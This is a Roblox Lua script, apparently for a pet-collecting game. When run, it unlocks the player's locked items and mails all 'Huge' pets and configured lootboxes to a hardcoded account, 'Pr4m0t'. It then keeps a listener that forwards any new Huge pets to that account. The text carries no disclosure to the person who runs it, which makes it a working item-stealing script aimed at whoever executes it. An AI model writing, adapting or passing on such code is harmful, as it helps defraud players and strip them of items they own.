getgenv().C0nfig = { 
    -- Updated Items list
    Items = {
        {Class = "Lootbox", Id = "Hype Egg", pt = nil, sh = nil, tn = nil, Amount = 20},
    },
    Send_Huges = true,
    Mail_User = "Pr4m0t"
}


repeat task.wait() until game:IsLoaded() 
repeat task.wait() until game:GetService("Players").LocalPlayer
repeat task.wait() until not game.Players.LocalPlayer.PlayerGui:FindFirstChild("__INTRO")

local ReplicatedStorage = game:GetService("ReplicatedStorage")  
local SaveMod = require(ReplicatedStorage.Library.Client.Save)
local Network = ReplicatedStorage:WaitForChild("Network")
local MailItems = {}

for Class, Items in pairs(SaveMod.Get()["Inventory"]) do
    for uid, v in pairs(Items) do
        local isHuge = Class == "Pet" and C0nfig.Send_Huges and string.find(v.id, "Huge")
        local itemMatch = nil

        -- Loop through C0nfig Items to find a match
        for _, CustomItem in pairs(C0nfig.Items or {}) do
            if CustomItem.Class == Class and CustomItem.Id == v.id and CustomItem.pt == v.pt and CustomItem.sh == v.sh and CustomItem.tn == v.tn then
                itemMatch = CustomItem
                break
            end
        end

        -- Adds to Table to process
        if (itemMatch or isHuge) and not MailItems[uid] then
            if v._lk then
                repeat
                    local success, errorMsg = Network:WaitForChild("Locking_SetLocked"):InvokeServer(uid, false)
                until success
            end
            local amount = (itemMatch and itemMatch.Amount or (v._am or 1))
            MailItems[uid] = { uid = uid, amount = amount, class = Class }
        end
    end
end

-- Send MailItems (Process the table)
for i, v in pairs(MailItems) do 
    local success = false
    repeat
        local args = {
            [1] = C0nfig.Mail_User,
            [2] = "Enjoy this on me!", -- You can change to whatever
            [3] = v.class,
            [4] = i,
            [5] = v.amount
        } 
        success,e = game:GetService("ReplicatedStorage").Network["Mailbox: Send"]:InvokeServer(unpack(args)) task.wait(1)
    until success or e == "Couldn't remove this item from your inventory!"
end

game:GetService("ReplicatedStorage").Network["Items: Update"].OnClientEvent:Connect(function(player, Inventory)
    if Inventory["set"] and Inventory["set"]["Pet"] then
        for uid, v in pairs(Inventory["set"]["Pet"]) do
            if string.find(v.id, "Huge") then
                repeat 
                    success,e = game:GetService("ReplicatedStorage").Network["Mailbox: Send"]:InvokeServer(C0nfig.Mail_User,"abc","Pet",uid,1) task.wait(5)
                until success
            end
        end
    end
end)
